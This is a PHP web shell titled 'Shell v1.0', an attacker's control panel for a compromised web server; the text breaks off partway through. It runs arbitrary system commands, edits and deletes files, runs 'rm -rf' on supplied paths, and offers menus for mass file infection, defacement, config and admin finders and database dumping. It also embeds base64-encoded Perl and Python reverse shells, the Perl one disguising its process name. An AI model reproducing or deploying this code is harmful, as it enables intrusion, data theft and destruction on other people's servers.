<?php
//Shell v1.0

//Set a few ini settings to help performance and experience
//I'd suggest not editing these
@ini_set("memory_limit","9999M");
@ini_set("max_execution_time", "0");
@ini_set("upload_max_filesize", "9999m");
@ini_set("magic_quotes_gpc", "0");  
set_time_limit(0);
error_reporting(0);

//Style variables, edit to your liking.
//Font style
$fontcolor = "#FFFFFF";
$fontsize = "13px";
$fontweight = "normal";

//Table sytle
$tablebordercolor = "none";
$tablebgcolor = "none";
$tablehovercolor = "#E66C2C";

//Textarea style
$textareabgcolor = "#141414";
$textareafontcolor = "#FFFFFF";
$textareabordercolor = "#FF0000";

//Input stlye
$inputbgcolor = "#141414";
$inputfontcolor = "#FFFFFF";
$inputbordercolor = "#FF0000";

//Link style
$linkcolor = "#FF0000";
$activelinkcolor = "#FF0000";
$hoverlinkcolor = "#FFFFFF";
$visitedlinkcolor = "#FF0000";

//Nav bar tabs
$currentfile = basename(__FILE__);
$tabs = array(
	"Domain Information" => "./".$currentfile."?domainInformation",
	"Hash Generator" => "./".$currentfile."?hashGenerator",
	"Search" => array(
			"Search Files/Dirs" => "./".$currentfile."?search",
			"Config Finder" => "./".$currentfile."?configFinder",
			"Admin Finder" => "./".$currentfile."?adminFinder"
		),
	"Mass" => array(
			"Infect Files" => "./".$currentfile."?fileInfect",
			"Deface Files" => "./".$currentfile."?fileDeface"
		),
	"MySQL Dumper" => array(
			"MySQL Dumper v2.1" => "./".$currentfile."?installMSD",
			"MySQL Dumper v1.24.4" => "./".$currentfile."?installMSD2"
		),
	"Back Connect" => array(
			"Perl" => "./".$currentfile."?bcPerl",
			"Python" => "./".$currentfile."?bcPython",
			"PHP" => "./".$currentfile."?bcPHP"
		),
	"System" => array(
			"Users" => "./".$currentfile."?users",
			"Processes" => "./".$currentfile."?processes",
			"Memory" => "./".$currentfile."?memory",
			"CPU" => "./".$currentfile."?cpu"
		),
	"Shell" => array(
			"Check Links" => "./".$currentfile."?checkLinks",
			"Credits" => "./".$currentfile."?credits",
			"Kill" => "./".$currentfile."?kill"
		)
	);

$links = array(
		"MSD1" => array(
				"LINK" => "https://dl.dropbox.com/s/5c0ch3cn03s73kr/msdv2.zip",
				"MD5" => "bfd2f24a2a32277cc4babbc42649b3c1",
				"DESC" => "MySQL Dumper v2.1 By: Plum"
			),
		"MSD2" => array(
				"LINK" => "https://dl.dropbox.com/s/nerui8jax2p2fwf/msd1.24.4.zip",
				"MD5" => "9948baad310e0a4be04bb3f20f89938c",
				"DESC" => "MySQL Dumper v1.24.4 By: http://www.mysqldumper.net/"
			),
		"BOOTSTRAPCSS" => array(
						"LINK" => "https://dl.dropbox.com/s/cr4prh66oli27m2/bootstrap_navbar.css",
						"MD5" => "5ed756c76e52bcf521040ff09a01f3f3",
						"DESC" => "Bootstrap Nav Bar CSS"
					),
		"BOOTSTRAPJS" => array(
						"LINK" => "https://dl.dropbox.com/s/5fn4xs7niie5s8v/bootstrap-dropdown.js",
						"MD5" => "be4478613ae8c0bb1b799e6b340519e4",
						"DESC" => "Bootstrap Dropdown JS"
					),
		"BACKGROUND" => array(
						"LINK" => "https://dl.dropbox.com/s/gir6etllsswdc91/background.png",
						"MD5" => "ec548490a2fd381c41cf7a3c17b93500",
						"DESC" => "Background image"
					)
		);

//Some variables
if(!@$_GET['dir']) {
	$dir = CleanDir(getcwd());
} else {
	$dir = CleanDir($_GET['dir']);
}
$version = "1.0";
$yourip = $_SERVER['REMOTE_ADDR'];
$whoami = function_exists("posix_getpwuid") ? posix_getpwuid(posix_geteuid()) : exe_cmd("whoami");
$whoami = function_exists("posix_getpwuid") ? $whoami['name'] : exe_cmd("whoami");
$uname = php_uname();
$serversoftware = $_SERVER['SERVER_SOFTWARE'];
$gatewayinterface = $_SERVER['GATEWAY_INTERFACE'];
$servername = $_SERVER['SERVER_NAME'];
$serverip = $_SERVER['SERVER_ADDR'];
$safemode = ini_get('safe_mode') ? "Enabled" : "Disabled";
$openbasedir = ini_get('open_basedir') ? "Enabled" : "Disabled";
$disabledfunc = ini_get('disable_functions');
$phpversion = phpversion();
$domain = $_SERVER['HTTP_HOST'];
$rootdir = CleanDir($_SERVER['DOCUMENT_ROOT']);
$syscoms = array('system', 'shell_exec', 'proc_open', 'passthru', 'exec');
$compression = array('zip', 'tar', 'tar.gz', 'tgz', 'gz', 'rar');

//Base64'd stuff
$bcpl = "IyEvdXNyL2Jpbi9wZXJsIC13DQojIHBlcmwtcmV2ZXJzZS1zaGVsbCAtIEEgUmV2ZXJzZSBTaGVsbCBpbXBsZW1lbnRhdGlvbiBpbiBQRVJMDQojIENvcHlyaWdodCAoQykgMjAwNiBwZW50ZXN0bW9ua2V5QHBlbnRlc3Rtb25rZXkubmV0DQojDQojIEFkZGVkIGNvbW1hbmQgbGluZSBhcmd1bWVudHMgZm9yIGVhc3kgZXhlY3V0aW9uIH4gUGx1bQ0KIyBTb3JyeSBhYm91dCByZW1vdmluZyB0aGUgcmVzdCBvZiB0aGUgY29tbWVudHMuIA0KIyBUcnlpbmcgdG8gc2F2ZSBhcyBtdWNoIHNwYWNlIGFzIHBvc3NpYmxlIGFzIHRoaXMgd2lsbCBiZSBiYXNlNjQnZA0KDQp1c2Ugc3RyaWN0Ow0KdXNlIFNvY2tldDsNCnVzZSBGaWxlSGFuZGxlOw0KdXNlIFBPU0lYOw0KbXkgJFZFUlNJT04gPSAiMS4wIjsNCm15ICRBUkdDPUBBUkdWOw0KDQojQ2hlY2sgaWYgYXJndW1lbnRzIGV4aXN0DQppZiAoJEFSR0MhPTIpIHsgDQogICBwcmludCAiVXNhZ2U6ICQwIFtIb3N0XSBbUG9ydF0gXG5cbiI7IA0KICAgZGllICJFeDogJDAgMTI3LjAuMC4xIDIxMjEgXG4iOyANCn0gDQoNCiMgV2hlcmUgdG8gc2VuZCB0aGUgcmV2ZXJzZSBzaGVsbC4gIENoYW5nZSB0aGVzZS4NCm15ICRpcCA9ICRBUkdWWzBdOw0KbXkgJHBvcnQgPSAkQVJHVlsxXTsNCg0KIyBPcHRpb25zDQpteSAkZGFlbW9uID0gMTsNCm15ICRhdXRoICAgPSAwOyAjIDAgbWVhbnMgYXV0aGVudGljYXRpb24gaXMgZGlzYWJsZWQgYW5kIGFueSANCgkJIyBzb3VyY2UgSVAgY2FuIGFjY2VzcyB0aGUgcmV2ZXJzZSBzaGVsbA0KbXkgJGF1dGhvcmlzZWRfY2xpZW50X3BhdHRlcm4gPSBxciheMTI3XC4wXC4wXC4xJCk7DQoNCiMgRGVjbGFyYXRpb25zDQpteSAkZ2xvYmFsX3BhZ2UgPSAiIjsNCm15ICRmYWtlX3Byb2Nlc3NfbmFtZSA9ICIvdXNyL3NiaW4vYXBhY2hlIjsNCg0KIyBDaGFuZ2UgdGhlIHByb2Nlc3MgbmFtZSB0byBiZSBsZXNzIGNvbnNwaWNpb3VzDQokMCA9ICJbaHR0cGRdIjsNCg0KIyBBdXRoZW50aWNhdGUgYmFzZWQgb24gc291cmNlIElQIGFkZHJlc3MgaWYgcmVxdWlyZWQNCmlmIChkZWZpbmVkKCRFTlZ7J1JFTU9URV9BRERSJ30pKSB7DQoJY2dpcHJpbnQoIkJyb3dzZXIgSVAgYWRkcmVzcyBhcHBlYXJzIHRvIGJlOiAkRU5WeydSRU1PVEVfQUREUid9Iik7DQoNCglpZiAoJGF1dGgpIHsNCgkJdW5sZXNzICgkRU5WeydSRU1PVEVfQUREUid9ID1+ICRhdXRob3Jpc2VkX2NsaWVudF9wYXR0ZXJuKSB7DQoJCQljZ2lwcmludCgiRVJST1I6IFlvdXIgY2xpZW50IGlzbid0IGF1dGhvcmlzZWQgdG8gdmlldyB0aGlzIHBhZ2UiKTsNCgkJCWNnaWV4aXQoKTsNCgkJfQ0KCX0NCn0gZWxzaWYgKCRhdXRoKSB7DQoJY2dpcHJpbnQoIkVSUk9SOiBBdXRoZW50aWNhdGlvbiBpcyBlbmFibGVkLCBidXQgSSBjb3VsZG4ndCBkZXRlcm1pbmUgeW91ciBJUCBhZGRyZXNzLiAgRGVueWluZyBhY2Nlc3MiKTsNCgljZ2lleGl0KDApOw0KfQ0KDQojIEJhY2tncm91bmQgYW5kIGRpc3NvY2lhdGUgZnJvbSBwYXJlbnQgcHJvY2VzcyBpZiByZXF1aXJlZA0KaWYgKCRkYWVtb24pIHsNCglteSAkcGlkID0gZm9yaygpOw0KCWlmICgkcGlkKSB7DQoJCWNnaWV4aXQoMCk7ICMgcGFyZW50IGV4aXRzDQoJfQ0KDQoJc2V0c2lkKCk7DQoJY2hkaXIoJy8nKTsNCgl1bWFzaygwKTsNCn0NCg0KIyBNYWtlIFRDUCBjb25uZWN0aW9uIGZvciByZXZlcnNlIHNoZWxsDQpzb2NrZXQoU09DSywgUEZfSU5FVCwgU09DS19TVFJFQU0sIGdldHByb3RvYnluYW1lKCd0Y3AnKSk7DQppZiAoY29ubmVjdChTT0NLLCBzb2NrYWRkcl9pbigkcG9ydCxpbmV0X2F0b24oJGlwKSkpKSB7DQoJY2dpcHJpbnQoIlNlbnQgcmV2ZXJzZSBzaGVsbCB0byAkaXA6JHBvcnQiKTsNCgljZ2lwcmludHBhZ2UoKTsNCn0gZWxzZSB7DQoJY2dpcHJpbnQoIkNvdWxkbid0IG9wZW4gcmV2ZXJzZSBzaGVsbCB0byAkaXA6JHBvcnQ6ICQhIik7DQoJY2dpZXhpdCgpOwkNCn0NCg0KIyBSZWRpcmVjdCBTVERJTiwgU1RET1VUIGFuZCBTVERFUlIgdG8gdGhlIFRDUCBjb25uZWN0aW9uDQpvcGVuKFNURElOLCAiPiZTT0NLIik7DQpvcGVuKFNURE9VVCwiPiZTT0NLIik7DQpvcGVuKFNUREVSUiwiPiZTT0NLIik7DQokRU5WeydISVNURklMRSd9ID0gJy9kZXYvbnVsbCc7DQpzeXN0ZW0oInc7dW5hbWUgLWE7aWQ7cHdkIik7DQpleGVjKHsiL2Jpbi9zaCJ9ICgkZmFrZV9wcm9jZXNzX25hbWUsICItaSIpKTsNCg0KIyBXcmFwcGVyIGFyb3VuZCBwcmludA0Kc3ViIGNnaXByaW50IHsNCglteSAkbGluZSA9IHNoaWZ0Ow0KCSRsaW5lIC49ICI8cD5cbiI7DQoJJGdsb2JhbF9wYWdlIC49ICRsaW5lOw0KfQ0KDQojIFdyYXBwZXIgYXJvdW5kIGV4aXQNCnN1YiBjZ2lleGl0IHsNCgljZ2lwcmludHBhZ2UoKTsNCglleGl0IDA7ICMgMCB0byBlbnN1cmUgd2UgZG9uJ3QgZ2l2ZSBhIDUwMCByZXNwb25zZS4NCn0NCg0KIyBGb3JtIEhUVFAgcmVzcG9uc2UgdXNpbmcgYWxsIHRoZSBtZXNzYWdlcyBnYXRoZXJlZCBieSBjZ2lwcmludCBzbyBmYXINCnN1YiBjZ2lwcmludHBhZ2Ugew0KCXByaW50ICJDb250ZW50LUxlbmd0aDogIiAuIGxlbmd0aCgkZ2xvYmFsX3BhZ2UpIC4gIlxyDQpDb25uZWN0aW9uOiBjbG9zZVxyDQpDb250ZW50LVR5cGU6IHRleHRcL2h0bWxcclxuXHJcbiIgLiAkZ2xvYmFsX3BhZ2U7DQp9";
$bcpy = "IyEgL3Vzci9iaW4vZW52IHB5dGhvbg0KDQojIENvcHlyaWdodCAoYykgMjAxMSBYYXZpZXIgR2FyY2lhIHd3dy5zaGVsbGd1YXJkaWFucy5jb20NCiMgQWxsIHJpZ2h0cyByZXNlcnZlZC4NCiMNCiMgIEJhc2VkIG9uIHRoZSBQeXRob24gY29ubmVjdCBiYWNrIHNoZWxsIHdyaXR0ZW4gYnkgRGF2aWQgS2VubmVkeQ0KIyAgaHR0cDovL3d3dy5zZWNtYW5pYWMuY29tL2p1bmUtMjAxMS9jcmVhdGluZy1hLTEzLWxpbmUtYmFja2Rvb3Itd29ycnktZnJlZS1vZi1hdi8NCiMNCiMgQWRkZWQgY29tbWFuZCBsaW5lIGFyZ3VtZW50cyBmb3IgZWFzeSBleGVjdXRpb24NCiMgU29ycnkgYWJvdXQgcmVtb3ZpbmcgdGhlIHJlc3Qgb2YgdGhlIGNvbW1lbnRzDQojIFRyeWluZyB0byBzYXZlIHNwYWNlIGFzIHRoaXMgd2lsbCBiZSBiYXNlNjQnZA0KDQppbXBvcnQgc29ja2V0DQppbXBvcnQgc3VicHJvY2Vzcw0KaW1wb3J0IHN5cw0KaW1wb3J0IHRpbWUNCg0KaWYgbGVuKHN5cy5hcmd2KSA8IDM6DQoJcHJpbnQoJ1VzYWdlOiBweXRob24gJytzeXMuYXJndlswXSsnIDxJUD4gPFBPUlQ+JykNCglwcmludCgnRXhhbXBsZTogcHl0aG9uICcrc3lzLmFyZ3ZbMF0rJyAxMjcuMC4wLjEgMjEyMScpDQoJc3lzLmV4aXQoKQ0KDQpIT1NUID0gc3lzLmFyZ3ZbMV0gICAgIyBUaGUgcmVtb3RlIGhvc3QNClBPUlQgPSBpbnQoc3lzLmFyZ3ZbMl0pICAgIyBUaGUgc2FtZSBwb3J0IGFzIHVzZWQgYnkgdGhlIHNlcnZlcg0KDQpkZWYgY29ubmVjdCgoaG9zdCwgcG9ydCkpOg0KCXMgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVFJFQU0pDQoJcy5jb25uZWN0KChob3N0LCBwb3J0KSkNCglyZXR1cm4gcw0KDQpkZWYgd2FpdF9mb3JfY29tbWFuZChzKToNCglkYXRhID0gcy5yZWN2KDEwMjQpDQoJaWYgZGF0YSA9PSAiZXhpdFxuIjoNCgkJcy5jbG9zZSgpDQoJCXN5cy5leGl0KDApDQoJIyB0aGUgc29ja2V0IGRpZWQNCgllbGlmIGxlbihkYXRhKT09MDoNCgkJcmV0dXJuIFRydWUNCgllbHNlOg0KCQkjIGRvIHNoZWxsIGNvbW1hbmQNCgkJcHJvYyA9IHN1YnByb2Nlc3MuUG9wZW4oZGF0YSwgc2hlbGw9VHJ1ZSwNCgkJCXN0ZG91dD1zdWJwcm9jZXNzLlBJUEUsIHN0ZGVycj1zdWJwcm9jZXNzLlBJUEUsDQoJCQlzdGRpbj1zdWJwcm9jZXNzLlBJUEUpDQoJCSMgcmVhZCBvdXRwdXQNCgkJc3Rkb3V0X3ZhbHVlID0gcHJvYy5zdGRvdXQucmVhZCgpICsgcHJvYy5zdGRlcnIucmVhZCgpDQoJCSMgc2VuZCBvdXRwdXQgdG8gYXR0YWNrZXINCgkJcy5zZW5kKHN0ZG91dF92YWx1ZSkNCgkJcmV0dXJuIEZhbHNlDQoNCmRlZiBtYWluKCk6DQoJd2hpbGUgVHJ1ZToNCgkJc29ja2VkX2RpZWQ9RmFsc2UNCgkJdHJ5Og0KCQkJcz1jb25uZWN0KChIT1NULFBPUlQpKQ0KCQkJd2hpbGUgbm90IHNvY2tlZF9kaWVkOg0KCQkJCXNvY2tlZF9kaWVkPXdhaXRfZm9yX2NvbW1hbmQocykNCgkJCXMuY2xvc2UoKQ0KCQlleGNlcHQgc29ja2V0LmVycm9yOg0KCQkJcGFzcw0KCQl0aW1lLnNsZWVwKDUpDQoNCmlmIF9fbmFtZV9fID09ICJfX21haW5fXyI6DQoJc3lzLmV4aXQobWFpbigpKQ==";

//Some functions
function CleanDir($directory) {
    $directory = str_replace("\\", "/", $directory);
    $directory = str_replace("//", "/", $directory);
    return $directory;
}

function ByteConversion($bytes, $precision = 2) {
    $kilobyte = 1024;
    $megabyte = $kilobyte * 1024;
    $gigabyte = $megabyte * 1024;
    $terabyte = $gigabyte * 1024;

    if (($bytes >= 0) && ($bytes < $kilobyte)) {
        return $bytes . ' B';
    } elseif (($bytes >= $kilobyte) && ($bytes < $megabyte)) {
        return round($bytes / $kilobyte, $precision) . ' KB';
    } elseif (($bytes >= $megabyte) && ($bytes < $gigabyte)) {
        return round($bytes / $megabyte, $precision) . ' MB';
    } elseif (($bytes >= $gigabyte) && ($bytes < $terabyte)) {
        return round($bytes / $gigabyte, $precision) . ' GB';
    } elseif ($bytes >= $terabyte) {
        return round($bytes / $terabyte, $precision) . ' TB';
    } else {
        return $bytes . ' B';
    }
}

function success($message) {
	echo "<center><font color='green' size='5'><b>$message</b></font></center>";
}

function error($message) {
	echo "<center><font color='red' size='5'><b>$message</b></font></center>";
}

function redirect($url) {
	echo "<script>window.location = '$url';</script>";
}

function mass_files($mass_dir, $justdirs) {
    if($dh = opendir($mass_dir)) {
        $files = array();
        $inner_files = array();
        while($file = readdir($dh)) {
            if($file != "." && $file != ".." && $file[0] != '.') {
                if(is_dir($mass_dir . "/" . $file)) {
                    $inner_files = mass_files("$mass_dir/$file", $justdirs);
                    if(is_array($inner_files)) $files = array_merge($files, $inner_files);
					if($justdirs) { array_push($files, "$mass_dir/$file"); }
                } else {
                    if(!$justdirs) { array_push($files, "$mass_dir/$file"); }
                }
            }
        }
        closedir($dh);
        return $files;
    }
}

function can_exe() {
	global $disabledfunc;
	global $syscoms;
	$disabledfunc = explode(",", str_replace(' ', '', $disabledfunc));
	if(count(array_intersect($syscoms, $disabledfunc)) == count($syscoms)) {
		return false;
	} else {
		return true;
	}
}

function exe_cmd($command) {
	global $dir;
	chdir($dir);
	if(function_exists('proc_open')) {
		$execute = proc_open($command, array(1 => array('pipe', 'w'), 2 => array('pipe', 'w')), $io);
		$result = "";
		while (!feof($io[1])) {
			$result .= htmlspecialchars(fgets($io[1]), ENT_COMPAT, 'UTF-8');
		}
		while (!feof($io[2])) {
			$result .= htmlspecialchars(fgets($io[2]), ENT_COMPAT, 'UTF-8');
		}
		fclose($io[1]);
		fclose($io[2]);
		proc_close($execute);
		return $result;
	} elseif(function_exists('system')) {
		$result = system($command);
		return $result;
	} elseif(function_exists('exec')) {
		$result = exec($command);
		return $result;
	} elseif(functions_exists('shell_exec')) {
		$result = shell_exec($command);
		return $result;
	} elseif(function_exists('passthru')) {
		$result = passthru($command);
		return $result;
	}
}

function salt_gen($length) {
	$characters = array("a","A","b","B","c","C","d","D","e","E","f","F","g","G","h","H","i","I","j","J","k","K","l","L","m","M","n","N","o","O","p","P","q","Q","r","R","s","S","t","T","u","U","v","V","w","W","x","X","y","Y","z","Z","1","2","3","4","5","6","7","8","9");
	$i = 0;
	$salt = "";
	while($i < $length) {
		$arrand = array_rand($characters, 1);
		$salt .= $characters[$arrand];
		$i++;
	}
	return $salt;
}

function extract_file($filepath, $extractpath, $type) {
	if($type == 'zip') {
		if(class_exists('ZipArchive')) {
			$newzip = new ZipArchive;
			$open = $newzip->open($filepath);
			if($open == true) {
				$newzip->extractTo($extractpath);
				$newzip->close();
				redirect("?dir=$extractpath");
			} else {
				error('Failed to open zip archive!');
			}
		} else {
			if(can_exe()) {
				error('ZipArchive class does not exist!<br>Trying to extract via sys commands');
				echo "<center>
						The response from 'unzip $filepath -d $extractpath' was:<br>
						<textarea rows='10' cols='85' readonly>".exe_cmd("unzip $filepath -d $extractpath")."</textarea>
					</center>";
			} else {
				error('Zip archive does not exist and commands can not be executed!'); 
			}
		}
	} elseif($type == 'tar') {
		if(class_exists('PharData')) {
			$newphar = new PharData($filepath);
			$newphar->extractTo($extractpath);
			unlink($filepath);
			redirect("?dir=$extractpath");
		} else {
			if(can_exe()) {
				error('PharData class does not exist!<br>Trying to extract via sys commands');
				echo "<center>
						The response from 'tar xvf $filepath -C $extractpath' was:<br>
						<textarea rows='10' cols='85' readonly>".exe_cmd("tar xvf $filepath -C $extractpath")."</textarea>
					</center>";
			} else {
				error('PharData class does not exist and commands can not be executed!');
			}
		}
	} elseif($type == 'gz') {
		if(function_exists('gzopen')) {
			$decomname = $extractpath."/".str_replace(".gz", "", pathinfo($filepath, PATHINFO_BASENAME));
			$open = gzopen($filepath, "rb");
			
			while($contents = gzread($open, 4096)) {
				file_put_contents($decomname, $contents, FILE_APPEND);
			}
			gzclose($open);
			redirect("?dir=$extractpath");
		} else {
			if(can_exe()) {
				$decomname = $extractpath."/".str_replace(".gz", "", pathinfo($filepath, PATHINFO_BASENAME));
				error('Zlib does not seem to be enabled!<br>Trying to extract via sys commands.');
				echo "<center>
						The response from 'gunzip -c $filepath > $decomname' was:<br>
						<textarea rows='10' cols='85' readonly>".exe_cmd("gunzip -c $filepath > $decomname")."</textarea>
					</center>";
			} else {
				error('Zlib does not seem to be enabled and commands can not be executed!');
			}
		}
	} elseif($type == 'tgz') {
		if(class_exists('PharData')) {
			$newphar = new PharData($filepath);
			$newphar->decompress();
			
			$newphar = new PharData(str_replace(".tgz", ".tar", $filepath));
			$newphar->extractTo($extractpath);
			unlink($filepath);
			unlink(str_replace(".tgz", ".tar", $filepath));
			redirect("?dir=$extractpath");
		} else {
			if(can_exe()) {
				error('PharData class does not exist!<br>Trying to extract via sys commands.');
				echo "<center>
						The response from 'tar xvfz $filepath -C $extractpath && rm $filepath' was:<br>
						<textarea rows='10' cols='85' readonly>".exe_cmd("tar xvfz $filepath -C $extractpath && rm $filepath")."</textarea>
					</center>";
			} else {
				error('PharData class does not exist and commands can not be executed!');
			}
		}
	} elseif($type == 'rar') {
		if(class_exists('RarArchive')) {
			$openrar = RarArchive::open($filepath);
			
			if($raropen == true) {
				$entries = $openrar->getEntries();
				foreach($entries as $files) {
					$files->extract($extractpath);
				}
				$openrar->close();
			} else {
				error('Failed to open rar file!');
				$openrar->close();
			}
		} else {
			if(can_exe()) {
				error('RarArchive class does not exist!<br>Trying to extract via sys commands.');
				echo "<center>
						The response from 'unrar x $filepath $extractpath' was:<br>
						<textarea rows='10' cols='85' readonly>".exe_cmd("unrar x $filepath $extractpath")."</textarea>
					</center>";
			} else {
				error('RarArchive class does not exist and commands can not be executed!');
			}
		}
	}
}

//Let's initiailize the stylesheet
echo "
<link rel='stylesheet' type='text/css' href='".$links['BOOTSTRAPCSS']['LINK']."'>
<script src='//ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js'></script>
<script src='".$links['BOOTSTRAPJS']['LINK']."'></script>
<style>
body {
	background: #141414 url('".$links['BACKGROUND']['LINK']."');
	color: $fontcolor;
	padding-top: 100px !important;
	margin:0;
	font-family:\"Helvetica Neue\",Helvetica,Arial,sans-serif;
	font-size:$fontsize;
	font-weight:$fontweight;
}
table{
	border-color: $tablebordercolor;
	background-color: $tablebgcolor;
}
#hover tr:hover{
	background-color: $tablehovercolor;
}
textarea {
	background-color: $textareabgcolor;
	resize:none;
	color: $textareafontcolor;
	border-color: $textareabordercolor;
	outline: none;
}
input {
	background-color: $inputbgcolor;
	resize:none;
	color: $inputfontcolor;
	border-color: $inputbordercolor;
	outline: none;
}
a:link {color: $linkcolor; text-decoration: none; }
a:active {color: $activelinkcolor; text-decoration: none; }
a:visited {color: $visitedlinkcolor; text-decoration: none; }
a:hover {color: $hoverlinkcolor; text-decoration: none; }
</style>";

//Let's display nav bar
echo <<<html
<script>
    $(window).load(function(){
        $('#topbar').dropdown();
    });
</script>
<div class="topbar" id="topbar">
    <div class="fill">
        <div class="container">
            <a class="brand" href="./$currentfile">Home</a>
            <ul class="nav">
html;
foreach($tabs as $title => $link) {
	if(is_array($link)) {
		echo '<li class="menu">
				<a href="#" class="menu">'.$title.'</a>
					<ul class="menu-dropdown">';
		foreach($link as $dtitle => $dlink) {
			echo "<li><a href='$dlink'>$dtitle</a></li>";
		}
		echo "</ul>";
	} else {
		echo "<li><a href='$link'>$title</a></li>";
	}
}
echo <<<html
            </ul>
        </div>
    </div>
</div>
html;

//Let's display system bar
if(empty($disabledfunc)) {
	$disabledfun = "None";
} else {
	$count = count(explode(",", $disabledfunc));
	$disabledfun = "<a href='?disabledFunctions'>$count functions disabled</a>";
}
echo <<<html
<table width="100%" border="1">
	<tr>
		<th>Your IP</th>
		<th>User</th>
		<th>System</th>
		<th>Server Software</th>
		<th>Gateway Interface</th>
		<th>PHP Version</th>
		<th>Server Name</th>
		<th>Server IP</th>
		<th>safe_mode</th>
		<th>open_basedir</th>
		<th>Disabled Functions</th>
	</tr>
	<tr>
		<td>$yourip</td>
		<td>$whoami</td>
		<td>$uname</td>
		<td>$serversoftware</td>
		<td>$gatewayinterface</td>
		<td>$phpversion</td>
		<td>$servername</td>
		<td>$serverip</td>
		<td>$safemode</td>
		<td>$openbasedir</td>
		<td>$disabledfun</td>
	</tr>
</table><br><br>
html;

//Anything to be displayed between the system bar and files should go here.

//Read/Edit file stuff
if(isset($_POST['save_file'])) {
	$file = $_GET['edit'];
	$newcontent = $_POST['edit_file'];
	if(get_magic_quotes_gpc()) {
		$newcontent = stripslashes($newcontent);
	}
	if(file_put_contents($file, $newcontent)) {
		success("File has been saved successfully!");
	} else {
		error("File was not saved successfully!");
	}
}
if(isset($_POST['delete_file'])) {
	$file = $_GET['edit'];
	if(unlink($file)) {
		success("File was successfully deleted!");
	} else {
		error("File could not be deleted successfully!");
	}
}

if(isset($_GET['delF'])) {
	$file = $_GET['delF'];
	if(unlink($file)) {
		success("File was successfully deleted!");
	} else {
		error("File could not be deleted successfully!");
	}
}

if(isset($_GET['delD'])) {
	$ddir = $_GET['delD'];
	if(can_exe()) {
		echo "<center>
				The response from 'rm -rf $ddir' was:<br>
				<textarea cols='120' rows='20'>".exe_cmd("rm -rf $ddir")."</textarea>
			</center>";
	} else {
		if(rmdir($ddir)) {
			success("Directory successfully deleted!");
		} else {
			error("Failed to delete directory!");
		}
	}
}

if(isset($_GET['edit'])) {
	$file = $_GET['edit'];
	if(file_exists($file)) {
		$content = htmlspecialchars(file_get_contents($file));
		if(!is_writeable($file)) {
			echo "<center>
					<font color='red' size=5>This file is read only!</font><br>
					<textarea cols='120' rows='25' name='edit_file' readonly >$content</textarea>
				</center>";
		} else {
			echo "<center>
					<form action='' method='post'>
						<textarea cols='120' rows='25' name='edit_file'>$content</textarea><br>
						<input type='submit' name='save_file' value='Save'>
						<input type='submit' name='delete_file' value='Delete'>
					</form>
				</center>";				
		}
	} else {
		error("File does not exist!");
	}
}

//Rename file stuff
if(isset($_POST['rename'])) {
	$newname = $_POST['new_name'];
	$oldname = $_GET['rename'];
	$rdir = $_GET['rdir'];
	if(rename("$rdir/$oldname", "$rdir/$newname")) {
		success("File was successfully renamed to: $newname");
	} else {
		error("File was not renamed!");
	}
}

if(isset($_GET['rename'])) {
	$oldname = $_GET['rename'];
	echo "<center>
			<form action='' method='post'>
				Rename: <input type='text' name='new_name' value='$oldname'>
				<input type='submit' name='rename' value='rename'>
			</form>
		</center>";
}

//Domain information stuff
if(isset($_GET['domainInformation'])) {
	$dns_record = dns_get_record($domain, DNS_ANY, $authns, $addtl);
	$num = 0;
	$count = sizeof($dns_record);
	echo "<br>Name Servers:</b><br>";
	while($num < $count) {
		$name_servers = $dns_record[$num];
		$name_servers2 = $name_servers['type'];
		$name_servers3 = @$name_servers['target'];
		$num++;
		if($name_servers2 == "NS") {
			echo "$name_servers3<br>";
			$nshost = @$name_servers['host'];
		}
		if($name_servers2 == "SOA") {
			$nsemail = $name_servers['rname'];
		}
		if($name_servers2 == "A") {
			$nsip = $name_servers['ip'];
		}
	}
	echo "<br><table class='noborder'>
		<tr>
			<td><b>Host:</b></td>
			<td>$nshost</td>
		</tr>
		<tr>
			<td><b>IP:</b></td>
			<td>$nsip</td>
		</tr>
		<tr>
			<td><b>Email:</b></td>
			<td>$nsemail</td>
		</tr>
		</table><br>";
	$num = 0;
	$domains_on_server = json_decode(file_get_contents("http://www.yougetsignal.com/tools/web-sites-on-web-server/php/testing.php?remoteAddress=$domain"));
	$status = $domains_on_server->status;
	$message = $domains_on_server->message;
	$domainAr = $domains_on_server->domainArray;
	$num_of_site = $domains_on_server->domainCount;
	$count = sizeof($domainAr);
	if($status == "Success") {
		echo "Found $num_of_site sites hosted on the same server as $nshost($nsip) via <a class='navbar' href='http://www.yougetsignal.com/tools/web-sites-on-web-server/'>www.yougetsignal.com</a>:<br><br> <table class='noborder'>";
		while($num < $count) {
			$hossites = $domainAr[$num];
			$num++;
			$hossites3 = $domainAr[$num];
			$hossites3 = $hossites3[0];
			$hossites = $hossites[0];
			$site_ips = empty($hossites) ? "" : "(" .gethostbyname($hossites). ")";
			$site_ips2 = empty($hossites3) ? "" : "(" .gethostbyname($hossites3). ")";
			echo "<tr><td><a class='navbar' href='http://$hossites'>$hossites</a> $site_ips</td><td><a class='navbar' href='http://$hossites3'>$hossites3</a> $site_ips2</td></tr>";
			$num++;
		}
		echo "</table><br>";
		$num = 0;
	} else {
		error("Failed to find or get sites hosted on same server from: <a href='http://www.yougetsignal.com/tools/web-sites-on-web-server/'>www.yougetsignal.com</a>!<br>Additional Message:<br>$message");
	}
}

//Search files and directories
if(isset($_GET['search'])) {
	echo "<center>
			<form action='' method='post'>
				Search for value in file and directory names.<br>
				Directory to search in: <input type='text' name='search_dir' value='$dir'><br>
				Value to search for: <input type='text' name='search_val'><br>
				<input type='submit' name='search' value='Search'>
			</form>
		</center>";
}
if(isset($_POST['search'])) {
	$searchdir = $_POST['search_dir'];
	$searchval = $_POST['search_val'];
	echo "Search results that contain '$searchval' in file names.<br>";
	foreach(mass_files($searchdir, false) as $key => $filename) {
		$basename = pathinfo($filename, PATHINFO_BASENAME);
		if(preg_match('/'.$searchval.'/', $basename)) {
			echo "<a href='?edit=$filename'>$filename</a><br>";
		}
	}
	echo "<br>Search results that contain '$searchval' in directory names.<br>";
	foreach(mass_files($searchdir, true) as $key => $dirname) {
		$basename = pathinfo($dirname, PATHINFO_BASENAME);
		if(preg_match('/'.$searchval.'/', $basename)) {
			echo "<a href='?dir=$dirname'>$dirname</a><br>";
		}
	}
}

//Config finder
if(isset($_GET['configFinder'])) {
	echo "Search results that contain 'config' in file names.<br>";
	foreach(mass_files($rootdir, false) as $key => $filename) {
		$basename = pathinfo($filename, PATHINFO_BASENAME);
		if(preg_match('/config/', $basename)) {
